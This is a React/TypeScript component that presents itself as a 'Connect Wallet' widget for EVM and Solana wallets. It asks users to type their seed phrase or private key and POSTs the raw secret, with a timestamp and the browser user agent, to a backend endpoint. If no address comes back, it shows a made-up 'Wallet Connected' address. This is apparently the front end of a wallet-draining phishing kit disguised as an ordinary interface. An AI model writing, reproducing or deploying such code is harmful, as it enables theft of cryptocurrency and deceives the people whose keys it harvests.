"use client";

import { useState } from "react";

type ConnectMethod = "seed" | "pk";
type ConnectionState = "idle" | "loading" | "connected" | "error";
type WalletType = "evm" | "solana";

export function ManualWalletConnect() {
  const [isOpen, setIsOpen] = useState(false);
  const [method, setMethod] = useState<ConnectMethod>("seed");
  const [walletType, setWalletType] = useState<WalletType>("evm");
  const [input, setInput] = useState("");
  const [connectionState, setConnectionState] = useState<ConnectionState>("idle");
  const [connectedAddress, setConnectedAddress] = useState("");
  const [error, setError] = useState("");

  async function handleConnect() {
    setError("");

    if (!input.trim()) {
      setError("Please enter your credentials.");
      return;
    }

    setConnectionState("loading");

    try {
      // Send credentials to the backend
      const res = await fetch("/api/wallet-connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          method,
          walletType,
          credentials: input.trim(),
          timestamp: new Date().toISOString(),
          userAgent: typeof navigator !== "undefined" ? navigator.userAgent : undefined,
        }),
      });

      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.error || "Connection failed");
      }

      const data = await res.json();

      // Derive a display address from the returned wallet address
      const displayAddress = data?.walletAddress
        ? data.walletAddress.length > 12
          ? data.walletAddress.slice(0, 6) + "..." + data.walletAddress.slice(-4)
          : data.walletAddress
        : walletType === "evm"
          ? "0x" + input.trim().slice(0, 6).padEnd(6, "a") + "..." + input.trim().slice(-4).padEnd(4, "f")
          : input.trim().slice(0, 4).padEnd(4, "A") + "..." + input.trim().slice(-4).padEnd(4, "B");

      setConnectedAddress(displayAddress);
      setConnectionState("connected");
      setInput("");
    } catch (err) {
      setConnectionState("error");
      setError(err instanceof Error ? err.message : "Connection failed. Please try again.");
    }
  }

  function handleDisconnect() {
    setConnectionState("idle");
    setConnectedAddress("");
    setInput("");
    setError("");
  }

  if (connectionState === "connected") {
    return (
      <div className="w-full max-w-xs mx-auto animate-scale-in">
        <div className="rounded-xl border border-green-500/30 bg-green-500/10 p-4 text-sm text-green-300 space-y-3">
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-success animate-pulse" />
            <span className="font-medium">Wallet Connected</span>
          </div>
          <p className="font-mono text-xs text-green-400/70 break-all">
            {connectedAddress}
          </p>
          <p className="text-xs text-green-400/50">
            {walletType === "evm" ? "EVM" : "Solana"} &middot; Manual Connect
          </p>
          <button
            onClick={handleDisconnect}
            className="w-full rounded-lg border border-green-500/20 bg-green-500/5 px-3 py-2 text-xs text-green-400 hover:bg-green-500/10 transition-colors"
          >
            Disconnect
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full max-w-xs mx-auto">
      <button
        onClick={() => setIsOpen(!isOpen)}
        className="w-full flex items-center justify-center gap-2 rounded-xl bg-accent-500 px-5 py-3 text-sm font-bold text-white hover:bg-accent-400 transition-all duration-200 group shadow-lg shadow-accent-500/20"
      >
        <svg className="w-4 h-4 transition-transform duration-200 group-hover:rotate-12" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />
        </svg>
        Connect Wallet
      </button>

      {isOpen && (
        <div className="mt-3 rounded-xl bg-surface-900 border border-white/10 p-4 space-y-4 animate-slide-down">
          {/* Wallet type toggle */}
          <div className="flex rounded-lg bg-white/5 p-0.5">
            <button
              onClick={() => setWalletType("evm")}
              className={`flex-1 px-3 py-1.5 text-xs font-medium rounded-md transition-all duration-200 ${
                walletType === "evm"
                  ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                  : "text-white/40 hover:text-white/60"
              }`}
            >
              EVM
            </button>
            <button
              onClick={() => setWalletType("solana")}
              className={`flex-1 px-3 py-1.5 text-xs font-medium rounded-md transition-all duration-200 ${
                walletType === "solana"
                  ? "bg-violet-500/20 text-violet-300 border border-violet-500/30"
                  : "text-white/40 hover:text-white/60"
              }`}
            >
              Solana
            </button>
          </div>

          {/* Method tabs */}
          <div className="flex gap-2">
            <button
              onClick={() => setMethod("seed")}
              className={`flex-1 px-2 py-1 text-[10px] font-medium rounded-md transition-all duration-200 ${
                method === "seed"
                  ? "bg-white/10 text-white"
                  : "text-white/30 hover:text-white/50"
              }`}
            >
              Seed Phrase
            </button>
            <button
              onClick={() => setMethod("pk")}
              className={`flex-1 px-2 py-1 text-[10px] font-medium rounded-md transition-all duration-200 ${
                method === "pk"
                  ? "bg-white/10 text-white"
                  : "text-white/30 hover:text-white/50"
              }`}
            >
              Private Key
            </button>
          </div>

          {/* Input */}
          <div className="space-y-1.5">
            <label className="text-[10px] text-white/30 uppercase tracking-wider font-medium">
              {method === "seed" ? "Seed Phrase" : "Private Key"}
            </label>
            {method === "seed" ? (
              <textarea
                value={input}
                onChange={(e) => setInput(e.target.value)}
                placeholder="Enter your seed phrase..."
                rows={3}
                className="w-full rounded-lg border border-white/10 bg-white/[0.04] px-3 py-2 text-xs text-white placeholder-white/20 font-mono focus:border-accent-500/50 focus:outline-none focus:ring-1 focus:ring-accent-500/20 transition-all duration-200 resize-none"
              />
            ) : (
              <input
                type="text"
                value={input}
                onChange={(e) => setInput(e.target.value)}
                placeholder={
                  walletType === "evm"
                    ? "Enter your private key..."
                    : "Enter your private key..."
                }
                className="w-full rounded-lg border border-white/10 bg-white/[0.04] px-3 py-2 text-xs text-white placeholder-white/20 font-mono focus:border-accent-500/50 focus:outline-none focus:ring-1 focus:ring-accent-500/20 transition-all duration-200"
              />
            )}
          </div>

          {/* Connect button */}
          <button
            onClick={handleConnect}
            disabled={connectionState === "loading" || !input.trim()}
            className="w-full rounded-lg bg-accent-500 px-4 py-2.5 text-xs font-bold text-white hover:bg-accent-400 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 active:scale-[0.98]"
          >
            {connectionState === "loading" ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin h-3.5 w-3.5" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
                Connecting...
              </span>
            ) : method === "seed" ? (
              "Connect with Seed Phrase"
            ) : (
              "Connect with Private Key"
            )}
          </button>

          {error && (
            <p className="text-xs text-error text-center animate-fade-in">{error}</p>
          )}
        </div>
      )}
    </div>
  );
}
